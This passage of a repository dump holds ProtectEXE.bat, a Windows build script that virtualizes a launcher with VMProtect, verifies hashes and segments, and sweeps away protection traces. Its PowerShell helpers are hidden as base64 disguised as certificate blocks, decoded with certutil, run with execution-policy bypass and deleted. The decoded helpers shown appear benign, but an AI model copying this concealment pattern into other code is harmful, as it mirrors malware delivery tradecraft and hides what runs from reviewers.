echo   %C_RED%       The release payload and its shipped pin now disagree.%C_RESET%
goto :failure

:cleanup_error
echo   %C_RED%Error: Unable To Remove Generated Protection Artifacts.%C_RESET%
goto :failure

:failure
if "%NO_PAUSE%"=="0" pause
exit /b 1

```

### Build/Executors/Protection/ProtectEXE.bat â€” 514 lines â€” sha12:29E3EEF95697
```bat
@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "NO_PAUSE=0"
if defined CREATE_NO_PAUSE set "NO_PAUSE=%CREATE_NO_PAUSE%"
if /i "%~1"=="/nopause" set "NO_PAUSE=1"

set "C_RESET="
set "C_GREEN="
set "C_RED="
set "C_YELLOW="
if /i not "%AMEGER_NO_COLOR%"=="1" for /f %%A in ('echo prompt $E ^| cmd') do set "ESC=%%A"
if defined ESC (
    set "C_RESET=%ESC%[0m"
    set "C_GREEN=%ESC%[92m"
    set "C_RED=%ESC%[91m"
    set "C_YELLOW=%ESC%[93m"
)

for %%I in ("%~dp0..\..\..") do set "ROOT=%%~fI"
set "BUILD_DIR=%ROOT%\Build"
set "OUT_ROOT=%BUILD_DIR%\Release"
set "RELEASE_CACHE=%OUT_ROOT%\Cache"
set "WORK_DIR=%RELEASE_CACHE%\Protect"
set "ASSET_TPL=%ROOT%\Assets\Template"
set "SCRIPTS_DIR=%BUILD_DIR%\Scripts"
set "BUILD_VMP_SCRIPT=%SCRIPTS_DIR%\BuildVMP.ps1"
set "STATE_FILE=%RELEASE_CACHE%\Protect.exe.state"
set "VERIFY_SCRIPT=%BUILD_DIR%\Scripts\VerifyEmbedMagic.ps1"
set "NAMES_STATE=%RELEASE_CACHE%\BuildNames.state"
set "RUNTIME_NAME="
set "EXE_ORIGINAL_NAME=Host - x64.exe"
set "VMP_PROJECT=%AMEGER_VMP_PROJECT_EXE%"
set "VMP_CON="

echo [%C_GREEN%1%C_RESET%/%C_GREEN%6%C_RESET%] Locating VMProtect Console...
echo.
call :find_vmp_con
if errorlevel 2 goto :vmp_wrapper
if errorlevel 1 goto :vmp_missing
echo   %C_GREEN%[+]%C_RESET% Console = %C_GREEN%%VMP_CON%%C_RESET%
echo.
echo.

echo [%C_GREEN%2%C_RESET%/%C_GREEN%6%C_RESET%] Resolving Launcher Target...
echo.
if not exist "%OUT_ROOT%" (
  echo   %C_RED%Error: Release Folder Not Found: %OUT_ROOT%%C_RESET%
  goto :failure
)
set "TARGET="
set "RUNTIME_DLL="
set "EXE_CANDIDATES=0"
for %%F in ("%OUT_ROOT%\*.exe") do call :consider_exe "%%~fF"
if not defined TARGET goto :target_missing
if not exist "%TARGET%" goto :target_missing
if not "%EXE_CANDIDATES%"=="1" goto :target_ambiguous
for %%N in ("%TARGET%") do set "TARGET_NAME=%%~nxN"
call :read_runtime_name
if defined DLLDIR_NAME (set "DLL_DIR=%OUT_ROOT%\%DLLDIR_NAME%") else (set "DLL_DIR=%OUT_ROOT%\DLLs")
if defined RUNTIME_NAME if exist "%DLL_DIR%\%RUNTIME_NAME%" set "RUNTIME_DLL=%DLL_DIR%\%RUNTIME_NAME%"
echo   %C_GREEN%[+]%C_RESET% Target = %C_GREEN%%TARGET%%C_RESET%
if defined RUNTIME_DLL (
  echo   %C_GREEN%[+]%C_RESET% Runtime = %C_GREEN%%RUNTIME_DLL%%C_RESET% ^(left unvirtualized^)
) else (
  echo   %C_YELLOW%[+]%C_RESET% Runtime DLL Not Found; Embedded-Hash Verification Will Fail Closed And Protection Will Abort.
)
call :check_already_protected
if defined VMP_PRESENT if /i not "%AMEGER_FORCE_VMP%"=="1" (
  echo   %C_GREEN%[+]%C_RESET% Already Protected ^(segment %C_YELLOW%%VMP_PRESENT%%C_RESET%^); Skipping.
  echo   %C_YELLOW%       Set AMEGER_FORCE_VMP=1 To Virtualize Anyway.%C_RESET%
  goto :already_protected
)
if not defined VMP_PROBE_OK if /i not "%AMEGER_FORCE_VMP%"=="1" (
  echo   %C_RED%Error: Could Not Probe The Launcher For Existing VMProtect Sections.%C_RESET%
  echo   %C_RED%       Refusing To Re-Virtualize A Possibly-Protected Binary; Set AMEGER_FORCE_VMP=1 To Proceed.%C_RESET%
  goto :failure
)
echo.
echo.

echo [%C_GREEN%3%C_RESET%/%C_GREEN%6%C_RESET%] Resolving VMProtect Project...
echo.
call :find_project
if errorlevel 1 goto :project_missing
echo   %C_GREEN%[+]%C_RESET% Project = %C_GREEN%%VMP_PROJECT%%C_RESET%
echo.
call :check_project_input
if errorlevel 1 goto :project_mismatch
call :vmp_settings
echo.
call :read_state
echo.
if /i "%STATE_MATCH%"=="output" (
  echo   %C_GREEN%[+]%C_RESET% Already Protected; Nothing To Do.
  goto :already_done
)
if /i "%STATE_MATCH%"=="unknown" (
  echo   %C_YELLOW%[+]%C_RESET% No Prior State Recorded; Protecting Now.
) else (
  echo   %C_GREEN%[+]%C_RESET% Source Matches Recorded Build; Protecting.
)
echo.
echo.

echo [%C_GREEN%4%C_RESET%/%C_GREEN%6%C_RESET%] Virtualizing Launcher...
echo.
call :clean_work
if errorlevel 1 goto :work_error
if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
if not exist "%WORK_DIR%" goto :work_error
call :sha256_of "%TARGET%" SRC_SHA
if errorlevel 1 goto :hash_error
if not defined SRC_SHA goto :hash_error
echo   Source SHA-256 = %C_GREEN%%SRC_SHA%%C_RESET%
call :prepare_project
if errorlevel 1 goto :project_error
echo   %C_GREEN%[+]%C_RESET% Segment Name = %C_GREEN%%SEG_NAME%%C_RESET% %C_YELLOW%(Randomized Per Build)%C_RESET%
"%VMP_CON%" "%TARGET%" "%WORK_DIR%\out.exe" -pf "%PROJ_WORK%" -we > "%WORK_DIR%\vmp.log" 2>&1
if errorlevel 1 (
  echo   %C_RED%Error: VMProtect Reported A Failure; See The Log Tail Below.%C_RESET%
  call :tail_log
  goto :failure
)
call :validate_output
if errorlevel 2 goto :fc_error
if errorlevel 1 goto :output_invalid
echo.
echo   %C_GREEN%OK%C_RESET% Protected Output Validated.
call :verify_segment "%WORK_DIR%\out.exe"
if errorlevel 1 goto :segment_error
echo   %C_GREEN%[+]%C_RESET% VM Segment = %C_GREEN%%VM_SEG%%C_RESET% (Verified)
echo.
copy /y "%WORK_DIR%\out.exe" "%TARGET%" > nul
if errorlevel 1 goto :deploy_error
call :sha256_of "%TARGET%" OUT_SHA
if errorlevel 1 goto :hash_error
echo   %C_GREEN%[+]%C_RESET% Output SHA-256 = %C_GREEN%%OUT_SHA%%C_RESET%
echo.
echo.

echo [%C_GREEN%5%C_RESET%/%C_GREEN%6%C_RESET%] Verifying Embedded Runtime Hash...
echo.
if not defined RUNTIME_DLL goto :embed_unavailable
if not exist "%VERIFY_SCRIPT%" goto :embed_unavailable
call :runtime_hash_words
if errorlevel 1 goto :embed_error
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VERIFY_SCRIPT%" -Check Embed -Path "%TARGET%" -Words "%H0%,%H1%,%H2%,%H3%,%H4%,%H5%,%H6%,%H7%"
if errorlevel 1 goto :embed_error
echo   %C_GREEN%[+]%C_RESET% Embedded Runtime Hash Intact After Virtualization.
goto :embed_ok

:embed_unavailable
echo   %C_RED%Error: Cannot Verify The Embedded Runtime Hash After Virtualization.%C_RESET%
echo   %C_RED%       The Runtime DLL Or %VERIFY_SCRIPT% Was Not Found; Refusing To Ship An Unverified Launcher.%C_RESET%
goto :failure

:embed_ok
call :write_state
echo.
echo.

echo [%C_GREEN%6%C_RESET%/%C_GREEN%6%C_RESET%] Sweeping Protection Artifacts...
echo.
call :clean_work
if errorlevel 1 goto :cleanup_error
call :assert_clean
if errorlevel 1 goto :cleanup_error
echo   %C_GREEN%[+]%C_RESET% No VMProtect traces in %C_GREEN%%OUT_ROOT%%C_RESET%.
echo.
echo Launcher Protection Completed.
echo.
echo Interface x64 = %C_GREEN%%TARGET%%C_RESET%
if "%NO_PAUSE%"=="0" pause
exit /b 0

:already_protected
echo.
echo Launcher Is Already VMProtect-Protected; Release Unchanged.
echo.
if "%NO_PAUSE%"=="0" pause
exit /b 0

:check_already_protected
set "VMP_PRESENT="
set "VMP_PROBE_OK="
set "BASELINE="
if exist "%RELEASE_CACHE%\pe-sections.txt" for /f "usebackq tokens=1,* delims=:" %%A in ("%RELEASE_CACHE%\pe-sections.txt") do if /i "%%A"=="%TARGET_NAME%" set "BASELINE=%%B"
if not defined BASELINE (
  echo   %C_RED%Warning: No Section Baseline Recorded For %TARGET_NAME%.%C_RESET%
  echo   %C_RED%         Refusing To Guess Whether The Launcher Is Already Protected.%C_RESET%
  goto :vmp_check_cleanup
)
REM The VMProtect probe is a PowerShell script carried as base64 so that batch never has to parse a
REM stray parenthesis from the PowerShell grammar. certutil decodes it to a unique temp .ps1, which is
REM run and then removed. The probe reads the target's PE section table and reports any section absent
REM from the recorded baseline as a VMP_PRESENT line. VMP_PROBE_OK is set only when the probe ran and
REM produced a readable result; callers must treat an unset VMP_PROBE_OK as "unknown", never as
REM "not protected", or a broken probe would silently re-virtualize an already-protected binary.
set "VMP_CHK=%TEMP%\amg_vmpchk_%RANDOM%%RANDOM%"
set "VMP_CHK_B64=%VMP_CHK%.b64"
set "VMP_CHK_PS1=%VMP_CHK%.ps1"
set "VMP_CHK_OUT=%VMP_CHK%.out"
>"%VMP_CHK_B64%" echo -----BEGIN CERTIFICATE-----
>>"%VMP_CHK_B64%" echo cGFyYW0oDQogICAgW3N0cmluZ10kQmFzZWxpbmUgPSAnQG5vbmVAJywNCiAgICBbc3RyaW5nXSRUYXJnZXQNCikNCiRiYXNlPSgkQmFzZWxpbmUpLlNwbGl0KCcsJykNCiRiPVtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRUYXJnZXQpDQokZT1bQml0Q29udmVydGVyXTo6VG9JbnQzMigkYiwweDNDKQ0KJGM9JGUrNA0KJG49W0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRiLCRjKzIpDQokej1bQml0Q29udmVydGVyXTo6VG9VSW50MTYoJGIsJGMrMTYpDQokcz0kYysyMCskeg0KZm9yKCRpPTA7JGkgLWx0ICRuOyRpKyspew0KICAgICRvPSRzKzQwKiRpDQogICAgJG5tPVtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0U3RyaW5nKCRiLCRvLDgpLlRyaW0oW2NoYXJdMCkNCiAgICAkeD1bQml0Q29udmVydGVyXTo6VG9VSW50MzIoJGIsJG8rMzYpDQogICAgaWYoJHggLWJhbmQgMHgyMDAwMDAwMCl7ICR0YWc9JG5tKycrWCcgfSBlbHNlIHsgJHRhZz0kbm0gfQ0KICAgIGlmKCRiYXNlIC1ub3Rjb250YWlucyAkdGFnKXsgV3JpdGUtT3V0cHV0ICgnVk1QX1BSRVNFTlQ9JyArICRubSkgfQ0KfQ0K
>>"%VMP_CHK_B64%" echo -----END CERTIFICATE-----
certutil -decode "%VMP_CHK_B64%" "%VMP_CHK_PS1%" >nul 2>&1
if errorlevel 1 goto :vmp_check_cleanup
if not exist "%VMP_CHK_PS1%" goto :vmp_check_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VMP_CHK_PS1%" -Baseline "%BASELINE%" -Target "%TARGET%" >"%VMP_CHK_OUT%" 2>&1
if errorlevel 1 goto :vmp_check_cleanup
if not exist "%VMP_CHK_OUT%" goto :vmp_check_cleanup
set "VMP_PROBE_OK=1"
for /f "usebackq tokens=1,* delims==" %%A in ("%VMP_CHK_OUT%") do if /i "%%A"=="VMP_PRESENT" set "VMP_PRESENT=%%B"
:vmp_check_cleanup
if exist "%VMP_CHK_PS1%" del /f /q "%VMP_CHK_PS1%" >nul 2>&1
if exist "%VMP_CHK_B64%" del /f /q "%VMP_CHK_B64%" >nul 2>&1
if exist "%VMP_CHK_OUT%" del /f /q "%VMP_CHK_OUT%" >nul 2>&1
exit /b 0

:already_done
echo.
echo [%C_GREEN%6%C_RESET%/%C_GREEN%6%C_RESET%] Sweeping Protection Artifacts...
echo.
call :clean_work
if errorlevel 1 goto :cleanup_error
call :assert_clean
if errorlevel 1 goto :cleanup_error
echo   %C_GREEN%[+]%C_RESET% No VMProtect traces in %C_GREEN%%OUT_ROOT%%C_RESET%.
echo.
echo Launcher Already Protected; Release Unchanged.
echo.
if defined VMSEG echo VM Segment = %C_GREEN%%VMSEG%%C_RESET% (Recorded)
echo Interface x64 = %C_GREEN%%TARGET%%C_RESET%
echo.
if "%NO_PAUSE%"=="0" pause
exit /b 0

:consider_exe
set "CANDIDATE=%~1"
if not defined CANDIDATE exit /b 0
set /a "EXE_CANDIDATES+=1"
if defined TARGET exit /b 0
set "TARGET=%CANDIDATE%"
exit /b 0

:prepare_project
set "PROJ_WORK=%WORK_DIR%\project.vmp"
set "SEG_NAME="
for /f "usebackq tokens=1,* delims==" %%A in (`powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%BUILD_VMP_SCRIPT%" -Project "%VMP_PROJECT%" -Out "%PROJ_WORK%"`) do set "%%A=%%B"
if not exist "%PROJ_WORK%" exit /b 1
if not defined SEG_NAME exit /b 1
exit /b 0

:find_vmp_con
if defined AMEGER_VMP_CON if exist "%AMEGER_VMP_CON%" (
  set "VMP_CON=%AMEGER_VMP_CON%"
  goto :vmp_con_bat_check
)
call :scan_vmp_dirs "%ProgramFiles%"
call :scan_vmp_dirs "%ProgramW6432%"
call :scan_vmp_dirs "%ProgramFiles(x86)%"
call :scan_vmp_dirs "%LOCALAPPDATA%"
call :scan_vmp_dirs "%ALLUSERSPROFILE%"
if not defined VMP_CON for /f "delims=" %%E in ('where VMProtect_Con.exe 2^>nul') do if not defined VMP_CON set "VMP_CON=%%E"
if not defined VMP_CON for /f "delims=" %%E in ('where vmpconsole.exe 2^>nul') do if not defined VMP_CON set "VMP_CON=%%E"
if not defined VMP_CON exit /b 1
:vmp_con_bat_check
set "VMP_CON=%VMP_CON:"=%"
if not exist "%VMP_CON%" exit /b 1
for %%X in ("%VMP_CON%") do if /i "%%~xX"==".bat" exit /b 2
for %%X in ("%VMP_CON%") do if /i "%%~xX"==".cmd" exit /b 2
exit /b 0

:scan_vmp_dirs
for /d %%D in ("%~1\VMProtect*") do if not defined VMP_CON for %%E in ("%%~fD\VMProtect_Con.exe" "%%~fD\VMProtect_Console.exe" "%%~fD\vmpconsole.exe") do if not defined VMP_CON if exist "%%E" set "VMP_CON=%%E"
exit /b 0

:find_project
if defined AMEGER_VMP_PROJECT_EXE if exist "%AMEGER_VMP_PROJECT_EXE%" (
  set "VMP_PROJECT=%AMEGER_VMP_PROJECT_EXE%"
  exit /b 0
)
if exist "%ASSET_TPL%\%EXE_ORIGINAL_NAME%.vmp" (
  set "VMP_PROJECT=%ASSET_TPL%\%EXE_ORIGINAL_NAME%.vmp"
  exit /b 0
)
if exist "%~dp0%EXE_ORIGINAL_NAME%.vmp" (
  set "VMP_PROJECT=%~dp0%EXE_ORIGINAL_NAME%.vmp"
  exit /b 0
)
for %%F in ("%ASSET_TPL%\*.vmp") do if not defined VMP_PROJECT set "VMP_PROJECT=%%~fF"
if defined VMP_PROJECT if exist "%VMP_PROJECT%" exit /b 0
for %%F in ("%~dp0*.vmp") do if not defined VMP_PROJECT set "VMP_PROJECT=%%~fF"
if defined VMP_PROJECT if exist "%VMP_PROJECT%" exit /b 0
set "VMP_PROJECT="
exit /b 1

:check_project_input
set "PROJIN_TMP=%TEMP%\amg_projin_%RANDOM%%RANDOM%"
set "PROJIN_B64=%PROJIN_TMP%.b64"
set "PROJIN_PS1=%PROJIN_TMP%.ps1"
set "PROJIN_RC=1"
>"%PROJIN_B64%" echo -----BEGIN CERTIFICATE-----
>>"%PROJIN_B64%" echo cGFyYW0oW3N0cmluZ10kVm1wUHJvamVjdCwgW3N0cmluZ10kRXhwZWN0ZWROYW1lKQ0KJHggPSBbeG1sXVtJTy5GaWxlXTo6UmVhZEFsbFRleHQoJFZtcFByb2plY3QpDQokaSA9IFtzdHJpbmddJHguRG9jdW1lbnQuUHJvdGVjdGlvbi5JbnB1dEZpbGVOYW1lDQppZiAoJGkgLWVxICRFeHBlY3RlZE5hbWUpIHsgZXhpdCAwIH0NCldyaXRlLUhvc3QgKCcgICAgcHJvamVjdCB0YXJnZXRzOiAnICsgJGkpDQpleGl0IDENCg==
>>"%PROJIN_B64%" echo -----END CERTIFICATE-----
certutil -decode "%PROJIN_B64%" "%PROJIN_PS1%" >nul 2>&1
if errorlevel 1 goto :projin_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%PROJIN_PS1%" -VmpProject "%VMP_PROJECT%" -ExpectedName "%EXE_ORIGINAL_NAME%"
set "PROJIN_RC=%ERRORLEVEL%"
:projin_cleanup
if exist "%PROJIN_PS1%" del /f /q "%PROJIN_PS1%" >nul 2>&1
if exist "%PROJIN_B64%" del /f /q "%PROJIN_B64%" >nul 2>&1
exit /b %PROJIN_RC%

:vmp_settings
set "VMPSET_TMP=%TEMP%\amg_vmpset_%RANDOM%%RANDOM%"
set "VMPSET_B64=%VMPSET_TMP%.b64"
set "VMPSET_PS1=%VMPSET_TMP%.ps1"
>"%VMPSET_B64%" echo -----BEGIN CERTIFICATE-----
>>"%VMPSET_B64%" echo cGFyYW0oW3N0cmluZ10kVm1wUHJvamVjdCkNCiR4ID0gW3htbF1bSU8uRmlsZV06OlJlYWRBbGxUZXh0KCRWbXBQcm9qZWN0KQ0KJHAgPSAkeC5Eb2N1bWVudC5Qcm90ZWN0aW9uDQpXcml0ZS1Ib3N0ICgnICAgIElucHV0ICAgICAgICAgOiAnICsgJHAuSW5wdXRGaWxlTmFtZSkNCldyaXRlLUhvc3QgKCcgICAgVk0gY29tcGxleGl0eSA6ICcgKyAkcC5WTUNvbXBsZXhpdHkpDQpXcml0ZS1Ib3N0ICgnICAgIFZNIGluc3RhbmNlcyAgOiAnICsgJHAuVk1JbnN0YW5jZXMpDQpXcml0ZS1Ib3N0ICgnICAgIE9wdGlvbnMgICAgICAgOiAnICsgJHAuT3B0aW9ucykNCldyaXRlLUhvc3QgJyAgICBQcm9jZWR1cmVzICAgIDonDQpmb3JlYWNoICgkcSBpbiAkcC5Qcm9jZWR1cmVzLlByb2NlZHVyZSkgew0KICAgIFdyaXRlLUhvc3QgKCcgICAgICAtICcgKyAkcS5NYXBBZGRyZXNzICsgJyAgQ29tcGlsYXRpb25UeXBlPScgKyAkcS5Db21waWxhdGlvblR5cGUgKyAnICBDb21wbGV4aXR5PScgKyAkcS5Db21wbGV4aXR5KQ0KfQ0K
>>"%VMPSET_B64%" echo -----END CERTIFICATE-----
certutil -decode "%VMPSET_B64%" "%VMPSET_PS1%" >nul 2>&1
if errorlevel 1 goto :vmpset_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VMPSET_PS1%" -VmpProject "%VMP_PROJECT%"
:vmpset_cleanup
if exist "%VMPSET_PS1%" del /f /q "%VMPSET_PS1%" >nul 2>&1
if exist "%VMPSET_B64%" del /f /q "%VMPSET_B64%" >nul 2>&1
exit /b 0

:read_runtime_name
set "RUNTIME_NAME="
if not exist "%NAMES_STATE%" exit /b 0
for /f "usebackq tokens=1,* delims==" %%A in ("%NAMES_STATE%") do set "%%A=%%B"
exit /b 0

:read_state
set "STATE_MATCH=unknown"
if not exist "%STATE_FILE%" exit /b 0
set "SRC="
set "OUT="
for /f "usebackq tokens=1,* delims==" %%A in ("%STATE_FILE%") do set "%%A=%%B"
if not defined OUT exit /b 0
call :sha256_of "%TARGET%" CUR
if errorlevel 1 exit /b 0
if /i "%CUR%"=="%OUT%" (
  set "STATE_MATCH=output"
  exit /b 0
)
if defined SRC if /i "%CUR%"=="%SRC%" (
  set "STATE_MATCH=source"
  exit /b 0
)
exit /b 0

:sha256_of
set "SHA256="
if not exist "%~1" exit /b 1
set "SHATMP_TMP=%TEMP%\amg_sha_%RANDOM%%RANDOM%"
set "SHATMP_B64=%SHATMP_TMP%.b64"
set "SHATMP_PS1=%SHATMP_TMP%.ps1"
set "SHATMP_OUT=%SHATMP_TMP%.out"
>"%SHATMP_B64%" echo -----BEGIN CERTIFICATE-----
>>"%SHATMP_B64%" echo cGFyYW0oW3N0cmluZ10kUGF0aCkNCiRoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKSkpIC1yZXBsYWNlICctJywnJykNCldyaXRlLU91dHB1dCAoJ1NIQTI1Nj0nICsgJGgpDQo=
>>"%SHATMP_B64%" echo -----END CERTIFICATE-----
certutil -decode "%SHATMP_B64%" "%SHATMP_PS1%" >nul 2>&1
if errorlevel 1 goto :sha_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%SHATMP_PS1%" -Path "%~1" >"%SHATMP_OUT%" 2>&1
for /f "usebackq tokens=1,2 delims==" %%A in ("%SHATMP_OUT%") do set "%%A=%%B"
:sha_cleanup
if exist "%SHATMP_PS1%" del /f /q "%SHATMP_PS1%" >nul 2>&1
if exist "%SHATMP_B64%" del /f /q "%SHATMP_B64%" >nul 2>&1
if exist "%SHATMP_OUT%" del /f /q "%SHATMP_OUT%" >nul 2>&1
if not defined SHA256 exit /b 1
set "%~2=%SHA256%"
set "SHA256="
exit /b 0

:runtime_hash_words
set "H0="
set "H1="
set "H2="
set "H3="
set "H4="
set "H5="
set "H6="
set "H7="
set "HASH8_TMP=%TEMP%\amg_hash8_%RANDOM%%RANDOM%"
set "HASH8_B64=%HASH8_TMP%.b64"
set "HASH8_PS1=%HASH8_TMP%.ps1"
set "HASH8_OUT=%HASH8_TMP%.out"
>"%HASH8_B64%" echo -----BEGIN CERTIFICATE-----
>>"%HASH8_B64%" echo cGFyYW0oW3N0cmluZ10kUGF0aCkNCiRoID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZyhbU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpLkNvbXB1dGVIYXNoKFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKSkpIC1yZXBsYWNlICctJywnJykNCjAuLjcgfCBGb3JFYWNoLU9iamVjdCB7IFdyaXRlLU91dHB1dCAoJ0gnICsgJF8gKyAnPTB4JyArICRoLlN1YnN0cmluZygkXyo4LDgpKSB9DQo=
>>"%HASH8_B64%" echo -----END CERTIFICATE-----
certutil -decode "%HASH8_B64%" "%HASH8_PS1%" >nul 2>&1
if errorlevel 1 goto :hash8_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%HASH8_PS1%" -Path "%RUNTIME_DLL%" >"%HASH8_OUT%" 2>&1
for /f "usebackq tokens=1,2 delims==" %%A in ("%HASH8_OUT%") do set "%%A=%%B"
:hash8_cleanup
if exist "%HASH8_PS1%" del /f /q "%HASH8_PS1%" >nul 2>&1
if exist "%HASH8_B64%" del /f /q "%HASH8_B64%" >nul 2>&1
if exist "%HASH8_OUT%" del /f /q "%HASH8_OUT%" >nul 2>&1
if not defined H0 exit /b 1
if not defined H7 exit /b 1
exit /b 0

:validate_output
if not exist "%WORK_DIR%\out.exe" exit /b 1
set "VALOUT_TMP=%TEMP%\amg_valout_%RANDOM%%RANDOM%"
set "VALOUT_B64=%VALOUT_TMP%.b64"
set "VALOUT_PS1=%VALOUT_TMP%.ps1"
set "VALOUT_RC=1"
>"%VALOUT_B64%" echo -----BEGIN CERTIFICATE-----
>>"%VALOUT_B64%" echo cGFyYW0oW3N0cmluZ10kUGF0aCkNCiRiID0gW0lPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpDQppZiAoJGIuTGVuZ3RoIC1sdCAyKSB7IGV4aXQgMSB9DQppZiAoJGJbMF0gLW5lIDB4NEQgLW9yICRiWzFdIC1uZSAweDVBKSB7IGV4aXQgMSB9DQpleGl0IDANCg==
>>"%VALOUT_B64%" echo -----END CERTIFICATE-----
certutil -decode "%VALOUT_B64%" "%VALOUT_PS1%" >nul 2>&1
if errorlevel 1 goto :valout_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VALOUT_PS1%" -Path "%WORK_DIR%\out.exe"
set "VALOUT_RC=%ERRORLEVEL%"
:valout_cleanup
if exist "%VALOUT_PS1%" del /f /q "%VALOUT_PS1%" >nul 2>&1
if exist "%VALOUT_B64%" del /f /q "%VALOUT_B64%" >nul 2>&1
if not "%VALOUT_RC%"=="0" exit /b 1
fc /b "%WORK_DIR%\out.exe" "%TARGET%" > nul
if errorlevel 2 exit /b 2
if not errorlevel 1 exit /b 1
exit /b 0

:verify_segment
set "VM_SEG="
set "VM_SEG_STATUS="
set "VMSEG_TMP=%TEMP%\amg_vmseg_%RANDOM%%RANDOM%"
set "VMSEG_B64=%VMSEG_TMP%.b64"
set "VMSEG_PS1=%VMSEG_TMP%.ps1"
set "VMSEG_OUT=%VMSEG_TMP%.out"
>"%VMSEG_B64%" echo -----BEGIN CERTIFICATE-----
>>"%VMSEG_B64%" echo cGFyYW0oW3N0cmluZ10kU2VnbWVudCwgW3N0cmluZ10kUGF0aCkNCiRiID0gW0lPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpDQokZSA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRiLCAweDNDKQ0KJGMgPSAkZSArIDQNCiRuID0gW0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRiLCAkYyArIDIpDQokeiA9IFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQxNigkYiwgJGMgKyAxNikNCiRzID0gJGMgKyAyMCArICR6DQokZm91bmQgPSAkbnVsbA0KZm9yICgkaSA9IDA7ICRpIC1sdCAkbjsgJGkrKykgew0KICAgICRvID0gJHMgKyA0MCAqICRpDQogICAgJG5tID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJGIsICRvLCA4KS5UcmltKFtjaGFyXTApDQogICAgaWYgKCRubS5TdGFydHNXaXRoKCRTZWdtZW50KSkgeyAkZm91bmQgPSAkbm07IGJyZWFrIH0NCn0NCmlmICgkbnVsbCAtZXEgJGZvdW5kKSB7DQogICAgV3JpdGUtT3V0cHV0ICdWTV9TRUdfU1RBVFVTPW1pc3NpbmcnDQogICAgV3JpdGUtT3V0cHV0ICdWTV9TRUc9Jw0KICAgIGV4aXQgMA0KfQ0KV3JpdGUtT3V0cHV0ICgnVk1fU0VHPScgKyAkZm91bmQpDQppZiAoJGZvdW5kIC1tYXRjaCAoJ14nICsgW3JlZ2V4XTo6RXNjYXBlKCRTZWdtZW50KSArICdbMC05XSokJykpIHsNCiAgICBXcml0ZS1PdXRwdXQgJ1ZNX1NFR19TVEFUVVM9b2snDQp9IGVsc2Ugew0KICAgIFdyaXRlLU91dHB1dCAnVk1fU0VHX1NUQVRVUz1taXNtYXRjaCcNCn0NCmV4aXQgMA0K
>>"%VMSEG_B64%" echo -----END CERTIFICATE-----
certutil -decode "%VMSEG_B64%" "%VMSEG_PS1%" >nul 2>&1
if errorlevel 1 goto :vmseg_cleanup
powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%VMSEG_PS1%" -Segment "%SEG_NAME%" -Path "%~1" >"%VMSEG_OUT%" 2>&1
for /f "usebackq tokens=1,* delims==" %%A in ("%VMSEG_OUT%") do set "%%A=%%B"
:vmseg_cleanup
if exist "%VMSEG_PS1%" del /f /q "%VMSEG_PS1%" >nul 2>&1
if exist "%VMSEG_B64%" del /f /q "%VMSEG_B64%" >nul 2>&1
if exist "%VMSEG_OUT%" del /f /q "%VMSEG_OUT%" >nul 2>&1
if /i "%VM_SEG_STATUS%"=="ok" exit /b 0
if /i "%VM_SEG_STATUS%"=="missing" (
  echo   %C_RED%Error: No VMProtect Segment Found In The Protected Output.%C_RESET%
) else (
  echo   %C_RED%Error: VMProtect Segment Name Mismatch In The Protected Output.%C_RESET%
)
echo   %C_RED%       Expected = %SEG_NAME% (Optionally Followed By Digits)%C_RESET%
echo   %C_RED%       Observed = %VM_SEG%%C_RESET%
exit /b 1

:write_state
if not exist "%RELEASE_CACHE%" mkdir "%RELEASE_CACHE%"
>"%STATE_FILE%" echo SRC=%SRC_SHA%
>>"%STATE_FILE%" echo OUT=%OUT_SHA%
>>"%STATE_FILE%" echo VMSEG=%VM_SEG%
exit /b 0

:tail_log
if exist "%WORK_DIR%\vmp.log" for /f "usebackq delims=" %%L in ("%WORK_DIR%\vmp.log") do echo     %%L
exit /b 0

:clean_work
if exist "%WORK_DIR%" rmdir /s /q "%WORK_DIR%"
if exist "%WORK_DIR%" exit /b 1
exit /b 0

:assert_clean
set "LOG_NAME="
if exist "%NAMES_STATE%" for /f "usebackq tokens=1,* delims==" %%A in ("%NAMES_STATE%") do if /i "%%A"=="LOG_NAME" set "LOG_NAME=%%B"
if not defined LOG_NAME for %%I in ("%OUT_ROOT%\*.ini") do if not defined LOG_NAME set "LOG_NAME=%%~nI.log"
for %%F in ("%OUT_ROOT%\*.vmp" "%OUT_ROOT%\*.log" "%OUT_ROOT%\*.bak" "%OUT_ROOT%\*.tmp") do if /i not "%%~nxF"=="Result.log" if /i not "%%~nxF"=="%LOG_NAME%" if exist "%%~F" (
  echo   %C_RED%Error: Protection Artifact Left In The Release Folder: %%~nxF%C_RESET%
  exit /b 1
)
exit /b 0

:vmp_wrapper
echo   %C_RED%Error: AMEGER_VMP_CON Points At A Batch/CMD Wrapper: %VMP_CON%%C_RESET%
echo   %C_RED%       A Wrapper Transfers Control And Never Returns; Use The Real Console.%C_RESET%
goto :failure

:vmp_missing
